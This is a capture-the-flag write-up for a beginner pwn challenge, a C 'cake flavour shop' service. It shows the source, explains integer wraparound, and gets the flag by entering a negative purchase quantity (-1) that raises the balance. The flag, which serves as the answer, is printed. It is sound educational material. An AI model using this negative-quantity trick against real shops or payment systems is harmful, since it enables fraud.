---
tags:
  - ctfs/challenges
ctf: "[[BrunnerCTF 2025]]"
areas:
  - "[[Programming]]"
  - "[[C]]"
solved: true
---

> [!info] Prompt
> **Difficulty:** Beginner  
**Author:** olexmeister
> 
> Brunnerne made an online flavour shop! Your wildest dreams can be fulfilled, it's actually hard to **WRAP** your head **AROUND** how amazing this software is!
> 
> `nc cake-flavour-shop.challs.brunnerne.xyz 33000`
> 
> There's also a file to download: `pwn_online-cake-flavour-shop.zip`.

# Walk Through

## Poking around

### Connect to the server

```
❯ nc cake-flavour-shop.challs.brunnerne.xyz 33000

Welcome to Overflowing Delights!
You have $15.

Menu:
1. Sample cake flavours
2. Check balance
3. Exit
> 

```

### Check out the `zip` archive

```
❯ unzip -l pwn_online-cake-flavour-shop.zip 
Archive:  pwn_online-cake-flavour-shop.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2025-08-21 21:24   pwn_online-cake-flavour-shop/
     2597  2025-08-21 06:32   pwn_online-cake-flavour-shop/shop.c
---------                     -------
     2597                     2 files

```

### Check out the code.

Unzip the archive. At the top of the file, `shop.c`, the first thing that stands out is the definition of some preprocessor macros:

``` c
#define FLAG_COST 100
#define BRUNNER_COST 10
#define CHOCOLATE_COST 7
#define DRØMMEKAGE_COST 5
```

`FLAG_COST` could be something useful...

Looking at the `main()` function, it seems the only case that allows us to interact with the program is case `1. Sample cake flavours`.

``` c
  int main() {                                                                    
      int balance = 15;                                                           
      int choice;                                                                 
                                                                                  
      printf("Welcome to Overflowing Delights!\n");                               
      printf("You have $%d.\n", balance);                                         
                                                                                  
      while (1) {                                                                 
          menu();                                                                 
          scanf("%d", &choice);                                                   
                                                                                  
          switch (choice)                                                         
          {                                                                       
          case 1:                                                                 
              balance = flavourMenu(balance);                                     
              break;                                                              
          case 2:                                                                 
              printf("You have $%d.\n", balance);                                 
              break;                                                              
          case 3:                                                                 
              printf("Goodbye!\n");                                               
              exit(0);                                                            
              break;                                                              
          default:                                                                
              printf("Invalid choice.\n");                                        
              break;                                                              
          }                                                                       
      }                                                                           
      return 0;                                                                   
  }   
```

#### Sample cake flavours

```
Which flavour would you like to sample?:
1. Brunner ($10)
2. Chocolate ($7)
3. Drømmekage ($5)
4. Flag Flavour ($100)
> 
```

Looks like we need to find a way to increase the balance on our account so we can afford to purchase the Flag Flavour of cake.

### Integer conversion vulnerability


#### What ChatGPT says the C standard says

> If you assign a negative value to an unsigned type:
> 
> The value is converted by repeatedly adding (or subtracting) **one more than the maximum value of the type** until the value is in range.
> 
> In practice, that means the value **wraps around modulo 2ⁿ**, where `n` is the number of bits in the unsigned type.

## Pwn

%%
TODO:
	
- Describe:
	- The vulnerability 
	- How it presents in this case
%%

```
Menu:
1. Sample cake flavours
2. Check balance
3. Exit
> 1

Which flavour would you like to sample?:
1. Brunner ($10)
2. Chocolate ($7)
3. Drømmekage ($5)
4. Flag Flavour ($100)
> 4
How many? -1
price for your purchase: -100
You bought -1 for $-100. Remaining: $115
brunner{wh0_kn3w_int3g3rs_c0uld_m4k3_y0u_rich}

```

## Flag found

**brunner{wh0_kn3w_int3g3rs_c0uld_m4k3_y0u_rich}**